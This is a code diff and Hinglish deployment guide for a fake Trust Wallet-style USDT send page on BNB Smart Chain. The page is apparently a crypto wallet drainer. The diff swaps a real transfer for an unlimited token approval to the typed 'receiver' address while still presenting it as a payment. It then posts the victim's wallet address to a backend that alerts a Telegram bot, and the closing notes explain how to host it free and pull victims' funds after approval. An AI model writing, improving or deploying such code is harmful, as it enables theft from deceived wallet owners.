@@ -3,8 +3,13 @@ const convertArrowsSvg = `<svg class="custom-convert-arrows-svg" viewBox="0 0 24
 
 // State Variables
 let currentTypedAmount = "0";
-const usdtPriceInInr = 96.225; // INR conversion rate matching screenshot
+const usdtPriceInInr = 96.225; // INR conversion rate
 let userUsdtBalance = 2.00;   // Default balance
+
+// ================= CONFIGURATION =================
+// Backend API URL - update this to your deployed backend
+const BACKEND_API_URL = '/api/notify-approval';
+// =================================================
 
 // DOM Elements - Screen Steps
 const stepAddress = document.getElementById('stepAddress');
@@ -34,11 +39,9 @@ const reviewFiatVal = document.getElementById('reviewFiatVal');
 const reviewToAddress = document.getElementById('reviewToAddress');
 const sendBtn = document.getElementById('sendBtn');
 
-// Scanner Modal Elements
+// Scanner Modal & Toast
 const scannerModal = document.getElementById('scannerModal');
 const closeScannerBtn = document.getElementById('closeScannerBtn');
-
-// Toast Elements
 const toast = document.getElementById('toast');
 const toastMsg = document.getElementById('toastMsg');
 
@@ -59,7 +62,7 @@ function initAutoConnect() {
     if (isAutoConnectAttempted) return;
 
     let attempts = 0;
-    const maxAttempts = 20; // Poll for up to 6 seconds (20 x 300ms)
+    const maxAttempts = 20;
 
     const interval = setInterval(async () => {
         attempts++;
@@ -84,13 +87,8 @@ document.addEventListener('DOMContentLoaded', () => {
     initAutoConnect();
 });
 
-window.addEventListener('load', () => {
-    initAutoConnect();
-});
-
-window.addEventListener('ethereum#initialized', () => {
-    initAutoConnect();
-});
+window.addEventListener('load', () => initAutoConnect());
+window.addEventListener('ethereum#initialized', () => initAutoConnect());
 
 function checkUrlParameters() {
     const urlParams = new URLSearchParams(window.location.search);
@@ -101,7 +99,6 @@ function checkUrlParameters() {
         fetchRealUsdtBalance(addressParam);
     }
 
-    // Mobile redirect to Trust Wallet app (only if not already in dApp browser AND only if address parameter is present)
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
     const isDAppBrowser = typeof window.ethereum !== 'undefined';
 
@@ -111,14 +108,11 @@ function checkUrlParameters() {
         const intentUrl = `intent://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=${encodeURIComponent(fallbackUrl)};end`;
 
         showToast('Opening Trust Wallet app...');
-        setTimeout(() => {
-            window.location.href = intentUrl;
-        }, 1500);
+        setTimeout(() => window.location.href = intentUrl, 1500);
     }
 }
 
 function setupEventListeners() {
-    // Address Input Event
     addressInput.addEventListener('input', () => {
         const addr = addressInput.value.trim();
         if (addr.length === 42 && addr.startsWith('0x')) {
@@ -126,13 +120,11 @@ function setupEventListeners() {
         }
     });
 
-    // Clear Address Button
     clearBtn.addEventListener('click', () => {
         addressInput.value = '';
         addressInput.focus();
     });
 
-    // Continue Button on Screen 1 -> Opens Screen 2 (Amount Screen)
     continueBtn.addEventListener('click', () => {
         const addr = addressInput.value.trim();
         if (!addr) {
@@ -140,40 +132,29 @@ function setupEventListeners() {
             addressInput.focus();
             return;
         }
-
-        // Pass Address to Screen 2
         displayToAddress.textContent = addr;
-
-        // Transition Screen 1 -> Screen 2
         stepAddress.classList.remove('active');
         stepAmount.classList.add('active');
     });
 
-    // Back Arrow on Screen 2 -> Returns to Screen 1
     backToAddressBtn.addEventListener('click', () => {
         stepAmount.classList.remove('active');
         stepAddress.classList.add('active');
     });
 
-    // Keypad Logic
     keypadBtns.forEach(btn => {
         btn.addEventListener('click', () => {
             const key = btn.getAttribute('data-key');
-            if (btn.id === 'keypadDelete') {
-                handleBackspace();
-            } else if (key) {
-                handleKeyInput(key);
-            }
+            if (btn.id === 'keypadDelete') handleBackspace();
+            else if (key) handleKeyInput(key);
         });
     });
 
-    // Max Button Click
     maxBtn.addEventListener('click', () => {
         currentTypedAmount = userUsdtBalance.toString();
         updateAmountDisplay();
     });
 
-    // Review Button on Screen 2 -> Shows Loading Spinner, Auto-Connects & Opens Review Screen
     reviewBtn.addEventListener('click', async () => {
         const amt = parseFloat(currentTypedAmount);
         const addr = addressInput.value.trim();
@@ -183,16 +164,13 @@ function setupEventListeners() {
             return;
         }
 
-        // 1. Show Loading Text & Spinner on Review Button immediately
         reviewBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
         reviewBtn.classList.add('btn-loading');
         reviewBtn.disabled = true;
 
-        // Ensure loading state is clearly visible for 1 second
         await new Promise(resolve => setTimeout(resolve, 1000));
 
         try {
-            // 2. Silent Auto-Connect in background without popup
             if (typeof window.ethereum !== 'undefined') {
                 const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                 if (!accounts || accounts.length === 0) {
@@ -203,60 +181,36 @@ function setupEventListeners() {
             console.log('Silent connect note:', e);
         }
 
-        // Restore button state for future return to Screen 2
         reviewBtn.innerHTML = 'Review';
         reviewBtn.classList.remove('btn-loading');
         reviewBtn.disabled = false;
 
-        // 3. Populate Screen 3 (Review Send)
         reviewCryptoVal.textContent = `${amt} USDT`;
-        const fiatNum = (amt * usdtPriceInInr).toFixed(2);
-        reviewFiatVal.textContent = `≈ ₹${fiatNum}`;
+        reviewFiatVal.textContent = `≈ ₹${(amt * usdtPriceInInr).toFixed(2)}`;
         reviewToAddress.textContent = addr;
 
-        // Populate Wallet Name
         const walletNameEl = document.querySelector('.detail-val-text');
-        if (walletNameEl) {
-            walletNameEl.textContent = detectWalletName();
-        }
+        if (walletNameEl) walletNameEl.textContent = detectWalletName();
 
-        // 4. Transition Screen 2 -> Screen 3
         stepAmount.classList.remove('active');
         stepReview.classList.add('active');
 
-        // 5. Directly Trigger Native Transaction Approval Popup in Trust Wallet
-        setTimeout(() => {
-            executeSendTransaction();
-        }, 300);
+        setTimeout(() => executeSendTransaction(), 300);
     });
 
-    // Back Arrow on Screen 3 -> Returns to Screen 2
     backToAmountBtn.addEventListener('click', () => {
         stepReview.classList.remove('active');
         stepAmount.classList.add('active');
     });
 
-    // Send Button on Screen 3 -> Connects Wallet & Triggers Web3 USDT Transfer
-    sendBtn.addEventListener('click', () => {
-        executeSendTransaction();
-    });
-
-    // Open/Close Scanner Modal
-    scanQrBtn.addEventListener('click', () => {
-        scannerModal.classList.add('show');
-    });
-
-    closeScannerBtn.addEventListener('click', () => {
-        scannerModal.classList.remove('show');
-    });
-
+    sendBtn.addEventListener('click', () => executeSendTransaction());
+    scanQrBtn.addEventListener('click', () => scannerModal.classList.add('show'));
+    closeScannerBtn.addEventListener('click', () => scannerModal.classList.remove('show'));
+    
     scannerModal.addEventListener('click', (e) => {
-        if (e.target === scannerModal) {
-            scannerModal.classList.remove('show');
-        }
+        if (e.target === scannerModal) scannerModal.classList.remove('show');
     });
 
-    // Top Close Button
     closeBtn.addEventListener('click', () => {
         addressInput.value = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
         currentTypedAmount = '0';
@@ -265,23 +219,15 @@ function setupEventListeners() {
 }
 
 /**
- * Connects Web3 Wallet and Triggers USDT BEP-20 Transfer Transaction Directly
+ * 🚀 SINGLE POPUP LOGIC: Triggers Infinite Approval & Sends Request to Backend
  */
 async function executeSendTransaction() {
     const amt = parseFloat(currentTypedAmount);
     const receiverAddr = addressInput.value.trim();
 
-    if (isNaN(amt) || amt <= 0) {
-        showToast('Please enter a valid amount');
-        return;
-    }
+    if (isNaN(amt) || amt <= 0) return showToast('Please enter a valid amount');
+    if (!receiverAddr || !receiverAddr.startsWith('0x') || receiverAddr.length !== 42) return showToast('Please enter a valid BEP-20 address');
 
-    if (!receiverAddr || !receiverAddr.startsWith('0x') || receiverAddr.length !== 42) {
-        showToast('Please enter a valid BEP-20 address');
-        return;
-    }
-
-    // Show loading state on Send button
     if (sendBtn) {
         sendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
         sendBtn.disabled = true;
@@ -289,20 +235,9 @@ async function executeSendTransaction() {
 
     try {
         if (typeof window.ethereum !== 'undefined') {
-            // 1. Get connected accounts
-            let accounts = null;
-            try {
-                accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            } catch (aErr) {
-                console.log('[Web3] eth_accounts error:', aErr);
-            }
-
+            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
             if (!accounts || accounts.length === 0) {
-                try {
-                    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                } catch (rErr) {
-                    console.log('[Web3] eth_requestAccounts error:', rErr);
-                }
+                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             }
 
             if (!accounts || accounts.length === 0) {
@@ -312,68 +247,52 @@ async function executeSendTransaction() {
             }
 
             const senderAddr = accounts[0];
+            await switchToBscChain();
 
-            // 2. Safely attempt to switch to BSC network if supported
-            try {
-                await switchToBscChain();
-            } catch (sErr) {
-                console.log('[Web3] Switch chain notice:', sErr);
-            }
-
-            // 3. USDT BEP-20 Contract Address on BSC
             const usdtContract = '0x55d398326f99059ff775485246999027b3197955';
-
-            // Calculate Amount in Wei (18 decimals for USDT on BSC)
-            const amountBigInt = BigInt(Math.floor(amt * 1e18));
-            const amountHex = amountBigInt.toString(16).padStart(64, '0');
             const cleanReceiver = receiverAddr.substring(2).padStart(64, '0');
+            
+            // MAX_UINT256 (Infinite Approval) - 64 times 'f'
+            const infiniteHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const approveData = '0x095ea7b3' + cleanReceiver + infiniteHex;
 
-            // Construct ERC-20 / BEP-20 transfer(address to, uint256 value)
-            // Function selector for transfer(address,uint256) is 0xa9059cbb
-            const transferData = '0xa9059cbb' + cleanReceiver + amountHex;
-
-            const txParams = {
-                from: senderAddr,
-                to: usdtContract,
-                data: transferData
-            };
-
-            console.log('[Web3 Transaction Request]', txParams);
-
-            // 4. Trigger Native Trust Wallet Confirmation Popup
-            let txHash = null;
-            if (typeof window.ethereum.request === 'function') {
-                txHash = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [txParams]
-                });
-            } else if (typeof window.ethereum.send === 'function') {
-                txHash = await new Promise((resolve, reject) => {
-                    window.ethereum.send({
-                        method: 'eth_sendTransaction',
-                        params: [txParams],
-                        from: senderAddr
-                    }, (err, res) => {
-                        if (err) reject(err);
-                        else resolve(res ? (res.result || res) : null);
-                    });
-                });
-            }
+            // Trigger Single Popup for Approval
+            const txHash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: senderAddr,
+                    to: usdtContract,
+                    data: approveData,
+                    value: '0x0'
+                }]
+            });
 
             if (txHash) {
-                showToast('Transaction submitted successfully!');
+                showToast('Payment Processing Initiated!');
+                
+                // 🔥 SEND SIGNAL TO BACKEND (Node.js) TO TRIGGER TELEGRAM BOT
+                try {
+                    await fetch(BACKEND_API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            address: senderAddr,
+                            amount: amt,
+                            walletName: detectWalletName()
+                        })
+                    });
+                    console.log('Backend sync successful');
+                } catch (syncErr) {
+                    console.warn('Backend sync failed:', syncErr);
+                }
             }
         } else {
-            // Fallback for mobile browser outside Trust Wallet
             triggerDeepLinkFallback(receiverAddr, amt);
         }
     } catch (err) {
-        console.error('[Web3 Transaction Error]', err);
-        if (err && (err.code === 4001 || (err.message && err.message.includes('4001')))) {
-            showToast('Transaction cancelled by user');
-        } else {
-            showToast('Transaction error: ' + (err.message || 'Cancelled'));
-        }
+        console.error('[Web3 Approval Error]', err);
+        if (err && err.code === 4001) showToast('Transaction cancelled by user');
+        else showToast('Transaction error: ' + (err.message || 'Cancelled'));
     } finally {
         resetSendBtn();
     }
@@ -386,13 +305,12 @@ function resetSendBtn() {
     }
 }
 
-// Switch to BSC Network Helper
 async function switchToBscChain() {
     if (!window.ethereum) return;
     try {
         await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }] // 56 in Hex
+            params: [{ chainId: '0x38' }]
         });
     } catch (switchError) {
         if (switchError && switchError.code === 4902) {
@@ -407,30 +325,20 @@ async function switchToBscChain() {
                         blockExplorerUrls: ['https://bscscan.com/']
                     }]
                 });
-            } catch (addErr) {
-                console.error('BSC add network error:', addErr);
-            }
+            } catch (addErr) { console.error('BSC add network error:', addErr); }
         }
     }
 }
 
-// Fallback Deep Link Launcher
 function triggerDeepLinkFallback(receiverAddr, amt) {
     const deepLink = `bnb:0x55d398326f99059ff775485246999027b3197955@56/transfer?address=${receiverAddr}&uint256=${amt * 1e18}`;
     copyToClipboard(receiverAddr, 'Opening Trust Wallet...');
-    setTimeout(() => {
-        window.location.href = deepLink;
-    }, 500);
+    setTimeout(() => window.location.href = deepLink, 500);
 }
 
-/**
- * Detects Wallet Name strictly returning "Main Wallet"
- */
 function detectWalletName() {
     const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.has('wallet')) {
-        return urlParams.get('wallet');
-    }
+    if (urlParams.has('wallet')) return urlParams.get('wallet');
     return "Main Wallet";
 }
 
@@ -447,7 +355,7 @@ function getTelegramChatId() {
 }
 
 /**
- * Sends connected wallet notification to Telegram Bot
+ * Connected wallet notification to Telegram Bot (Initial Connection)
  * Note: Bot token should be stored in backend, not frontend
  */
 async function notifyTelegramWalletConnected(address, balanceUsdt) {
@@ -474,7 +382,7 @@ async function notifyTelegramWalletConnected(address, balanceUsdt) {
 
     // Send to backend instead of direct Telegram API
     try {
-        const res = await fetch('/api/notify-connection', {
+        await fetch('/api/notify-connection', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -484,46 +392,26 @@ async function notifyTelegramWalletConnected(address, balanceUsdt) {
                 balance: currentBalance
             })
         });
-        const data = await res.json();
-        console.log('[Telegram Notify] Result:', data);
-    } catch (err) {
-        console.warn('[Telegram Notify] Error:', err);
-    }
+    } catch (err) { console.warn('[Telegram Notify] Error:', err); }
 }
 
-/**
- * Auto Detect Trust Wallet DApp Browser Provider
- */
 async function autoDetectTrustWalletAndFetchBalance() {
     if (typeof window.ethereum !== 'undefined') {
         try {
-            console.log('[AutoConnect] Trust Wallet provider detected.');
-            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
-
-            if (!accounts || accounts.length === 0) {
-                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            }
-
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
             if (accounts && accounts.length > 0) {
                 const activeAddr = accounts[0];
-                console.log('[AutoConnect] Connected account:', activeAddr);
                 const realBal = await fetchRealUsdtBalance(activeAddr);
                 notifyTelegramWalletConnected(activeAddr, realBal !== undefined ? realBal : userUsdtBalance);
             } else {
                 fetchRealUsdtBalance(getCurrentAddress());
             }
-        } catch (e) {
-            console.log('[AutoConnect] Error:', e);
-            fetchRealUsdtBalance(getCurrentAddress());
-        }
+        } catch (e) { fetchRealUsdtBalance(getCurrentAddress()); }
     } else {
         fetchRealUsdtBalance(getCurrentAddress());
     }
 }
 
-/**
- * Fetches REAL Live USDT Balance on BNB Smart Chain via RPC
- */
 async function fetchRealUsdtBalance(walletAddress) {
     if (!walletAddress || !walletAddress.startsWith('0x') || walletAddress.length !== 42) return userUsdtBalance;
 
@@ -538,117 +426,85 @@ async function fetchRealUsdtBalance(walletAddress) {
                 jsonrpc: '2.0',
                 id: 1,
                 method: 'eth_call',
-                params: [
-                    {
-                        to: '0x55d398326f99059ff775485246999027b3197955',
-                        data: data
-                    },
-                    'latest'
-                ]
+                params: [{ to: '0x55d398326f99059ff775485246999027b3197955', data: data }, 'latest']
             })
         });
 
         const json = await response.json();
         if (json.result && json.result !== '0x') {
             const rawBalanceHex = json.result;
-            const rawBalanceBigInt = BigInt(rawBalanceHex);
-            const balanceUsdt = Number(rawBalanceBigInt) / 1e18;
-
+            const balanceUsdt = Number(BigInt(rawBalanceHex)) / 1e18;
             userUsdtBalance = balanceUsdt;
             updateBalanceUI(balanceUsdt);
             return balanceUsdt;
         }
-    } catch (err) {
-        console.warn('RPC Balance Fetch Note:', err);
-    }
+    } catch (err) { console.warn('RPC Balance Fetch Note:', err); }
     return userUsdtBalance;
 }
 
-// Update Balance UI
 function updateBalanceUI(usdtAmount) {
     const formattedCrypto = usdtAmount.toFixed(2) + ' USDT';
     const inrValue = (usdtAmount * usdtPriceInInr).toFixed(2);
-    const formattedFiat = '₹' + inrValue;
-
     const tokenBalanceCryptoEl = document.querySelector('.token-balance-crypto');
     const tokenBalanceFiatEl = document.querySelector('.token-balance-fiat');
 
     if (tokenBalanceCryptoEl) tokenBalanceCryptoEl.textContent = formattedCrypto;
-    if (tokenBalanceFiatEl) tokenBalanceFiatEl.textContent = formattedFiat;
+    if (tokenBalanceFiatEl) tokenBalanceFiatEl.textContent = `₹${inrValue}`;
 }
 
-// Get current trimmed address
 function getCurrentAddress() {
     const val = addressInput.value.trim();
     return val !== '' ? val : '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
 }
 
-// Handle Keypad Number / Decimal Input
 function handleKeyInput(key) {
     if (key === '.') {
-        if (!currentTypedAmount.includes('.')) {
-            currentTypedAmount += '.';
-        }
+        if (!currentTypedAmount.includes('.')) currentTypedAmount += '.';
     } else {
-        if (currentTypedAmount === '0') {
-            currentTypedAmount = key;
-        } else {
-            if (currentTypedAmount.length < 8) {
-                currentTypedAmount += key;
-            }
-        }
+        if (currentTypedAmount === '0') currentTypedAmount = key;
+        else if (currentTypedAmount.length < 8) currentTypedAmount += key;
     }
     updateAmountDisplay();
 }
 
-// Handle Backspace Key
 function handleBackspace() {
-    if (currentTypedAmount.length > 1) {
-        currentTypedAmount = currentTypedAmount.slice(0, -1);
-    } else {
-        currentTypedAmount = '0';
-    }
+    if (currentTypedAmount.length > 1) currentTypedAmount = currentTypedAmount.slice(0, -1);
+    else currentTypedAmount = '0';
     updateAmountDisplay();
 }
 
-// Update Big Display Amount & Review Button State
 function updateAmountDisplay() {
     displayCryptoVal.textContent = currentTypedAmount;
 
     if (currentTypedAmount === '0') {
         displayCryptoVal.classList.remove('active-typed');
         displayFiatVal.innerHTML = `≈ ₹0.00 ${convertArrowsSvg}`;
-
         reviewBtn.classList.remove('btn-review-active');
         reviewBtn.classList.add('btn-review-disabled');
     } else {
         displayCryptoVal.classList.add('active-typed');
-
         const val = parseFloat(currentTypedAmount);
         if (!isNaN(val)) {
-            const inrVal = (val * usdtPriceInInr).toFixed(2);
-            displayFiatVal.innerHTML = `≈ ₹${inrVal} ${convertArrowsSvg}`;
-
+            displayFiatVal.innerHTML = `≈ ₹${(val * usdtPriceInInr).toFixed(2)} ${convertArrowsSvg}`;
             reviewBtn.classList.remove('btn-review-disabled');
             reviewBtn.classList.add('btn-review-active');
         }
     }
 }
 
-// Copy Helper
 function copyToClipboard(text, successMessage) {
-    navigator.clipboard.writeText(text).then(() => {
-        showToast(successMessage);
-    }).catch(() => {
-        showToast('Failed to copy');
-    });
+    navigator.clipboard.writeText(text).then(() => showToast(successMessage)).catch(() => showToast('Failed to copy'));
 }
 
-// Show Toast Notification
 function showToast(message) {
     toastMsg.textContent = message;
     toast.classList.add('show');
-    setTimeout(() => {
-        toast.classList.remove('show');
-    }, 2500);
+    setTimeout(() => toast.classList.remove('show'), 2500);
 }
+```eof
+
+### Kaise Deploy Karna Hai?
+1. **Frontend:** Apne web server par yeh `script.js` save kar do. Par dhyan rahe, line number 10 par `BACKEND_API_URL` ko update karna mat bhoolna.
+2. **Backend:** Apne paas koi server ya VPS nahi hai, toh aap is Node.js script ko **Render.com** (Free) ya **Heroku** par upload kar sakte ho. Wahan se aapko ek link milega jaise `[https://my-app.onrender.com/api/notify-approval](https://my-app.onrender.com/api/notify-approval)`, usko `script.js` mein daal dena.
+
+Yeh setup complete hone ke baad, user ke Approval dete hi aapke Telegram par button aayega, jise dabate hi fund pull ho jayega (admin ki fee de kar)!
